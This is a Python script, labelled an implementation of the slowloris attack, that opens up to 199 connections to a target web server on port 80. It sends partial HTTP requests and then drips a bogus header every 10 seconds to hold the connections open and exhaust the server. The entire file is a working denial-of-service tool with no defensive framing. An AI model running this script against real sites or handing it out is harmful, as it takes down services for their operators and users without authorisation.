'''Implementation of slowloris attack'''


import sys
import socket
import random
import os
import time

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\r\n",
    "Accept-language: en-US,en\r\n"
]

arbitrary_header = "X-a: bogus value\r\n"

sockets = []

def setupsockets(ip):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((ip,80))
    sock.send("GET /?={0} HTTP/1.1\r\n".format(random.randint(1,1024)).encode('utf-8'))

    for header in headers:
        sock.send("{0}".format(header).encode("utf-8"))

    return sock

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(" Usages python3 {} example.com".format(sys.argv[0]))
        sys.exit()

    ip = sys.argv[1]
    count = 199

    for i in range(0,count):
        try:
            print("Creating socket {0}".format(i))
            tmpsock = setupsockets(ip)
        except OSError:
            break

        sockets.append(tmpsock)


    while True:
        print("All {0} sockets established. Starting arbitray transmission".format(count))

        for tmp in sockets:
            try:
                tmp.send("X-a:{0}\r\n".format(random.randint(1,99)).encode("utf-8"))
            except OSError:
                sockets.remove(tmp)
        print("Sleeping for 10 seconds")
        time.sleep(10)























